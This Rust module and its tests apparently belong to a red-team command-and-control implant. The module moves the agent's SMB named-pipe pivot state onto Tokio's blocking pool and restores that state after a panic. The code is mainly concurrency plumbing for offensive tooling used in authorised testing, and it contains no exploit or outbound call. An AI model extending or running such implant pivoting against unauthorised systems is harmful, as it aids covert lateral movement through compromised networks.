//! Pivot-state bridge: runs blocking PivotState operations on the Tokio blocking pool.

use std::sync::{Arc, Mutex};

use tokio::task;

use crate::dispatch::Response;
use crate::error::SpecterError;
use crate::pivot::PivotState;

use super::SpecterAgent;

/// Recover sole ownership after the blocking task has dropped its `Arc` clone.
fn take_pivot_state_from_shared_arc(
    state: Arc<Mutex<PivotState>>,
) -> Result<PivotState, SpecterError> {
    let mutex = Arc::try_unwrap(state).map_err(|_| {
        SpecterError::Transport("pivot state: unexpected shared arc (internal error)".into())
    })?;
    Ok(mutex.into_inner().unwrap_or_else(|poisoned| poisoned.into_inner()))
}

impl SpecterAgent {
    /// Run `f` on the blocking pool while keeping [`PivotState`] in an [`Arc`].
    ///
    /// If [`task::spawn_blocking`] returns a [`JoinError`](task::JoinError) (panic or
    /// runtime shutdown), we still reattach the mutex-held state so active pivots and
    /// queued responses are not replaced with [`PivotState::default`].
    pub(super) async fn with_pivot_state_blocking<F, R>(
        &mut self,
        op_label: &'static str,
        run: F,
    ) -> Result<R, SpecterError>
    where
        F: FnOnce(&mut PivotState) -> R + Send + 'static,
        R: Send + 'static,
    {
        let state = Arc::new(Mutex::new(std::mem::take(&mut self.pivot_state)));
        let state_for_blocking = Arc::clone(&state);
        let join_result = task::spawn_blocking(move || {
            let mut ps = state_for_blocking.lock().unwrap_or_else(|poisoned| poisoned.into_inner());
            run(&mut ps)
        })
        .await;

        self.pivot_state = take_pivot_state_from_shared_arc(state)?;

        join_result.map_err(|e| SpecterError::Transport(format!("{op_label} task failed: {e}")))
    }

    pub(super) async fn handle_pivot_command(
        &mut self,
        payload: &[u8],
    ) -> Result<Option<Response>, SpecterError> {
        let payload = payload.to_vec();
        let response = self
            .with_pivot_state_blocking("pivot command", move |pivot_state| {
                pivot_state.handle_command(&payload)
            })
            .await?;
        Ok(response)
    }

    pub(super) async fn poll_pivots(&mut self) -> Result<(), SpecterError> {
        self.with_pivot_state_blocking("pivot poll", |pivot_state| pivot_state.poll()).await?;
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::SpecterConfig;
    use red_cell_common::demon::{DemonCommand, DemonPivotCommand};

    #[tokio::test]
    async fn handle_pivot_command_runs_on_blocking_pool() {
        let mut agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
        let payload = u32::from(DemonPivotCommand::List).to_le_bytes();

        let response = agent.handle_pivot_command(&payload).await.expect("pivot response");
        let response = response.expect("list response");

        assert_eq!(response.command_id, u32::from(DemonCommand::CommandPivot));
        assert_eq!(
            u32::from_le_bytes(response.payload[..4].try_into().expect("subcommand")),
            u32::from(DemonPivotCommand::List)
        );
    }

    #[tokio::test]
    async fn handle_pivot_command_returns_non_windows_connect_error() {
        if cfg!(windows) {
            return;
        }

        let mut agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
        let pipe = r"\\.\pipe\test";
        let pipe_utf16: Vec<u8> = pipe
            .encode_utf16()
            .chain(std::iter::once(0u16))
            .flat_map(|c| c.to_le_bytes())
            .collect();

        let mut payload = Vec::new();
        payload.extend_from_slice(&u32::from(DemonPivotCommand::SmbConnect).to_le_bytes());
        payload.extend_from_slice(&(pipe_utf16.len() as u32).to_le_bytes());
        payload.extend_from_slice(&pipe_utf16);

        let response = agent.handle_pivot_command(&payload).await.expect("pivot response");
        let response = response.expect("error response");

        assert_eq!(u32::from_le_bytes(response.payload[4..8].try_into().expect("success flag")), 0);
    }

    #[tokio::test]
    async fn poll_pivots_runs_on_blocking_pool() {
        let mut agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
        agent.poll_pivots().await.expect("pivot poll");
        assert!(!agent.pivot_state.has_active_pivots());
    }

    /// When `spawn_blocking` completes with a join error, pivot state must not
    /// remain the default left behind by `mem::take`.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn pivot_state_restored_when_blocking_task_panics() {
        let mut agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
        agent.pivot_state.test_insert_stub_pivot(0x42);
        assert!(agent.pivot_state.has_active_pivots());

        let err = agent
            .with_pivot_state_blocking("pivot test", |_| panic!("forced blocking panic"))
            .await
            .expect_err("blocking task should panic");

        assert!(matches!(err, SpecterError::Transport(_)));
        assert!(
            agent.pivot_state.has_active_pivots(),
            "pivot state must be restored after join error, not left at default"
        );
    }
}
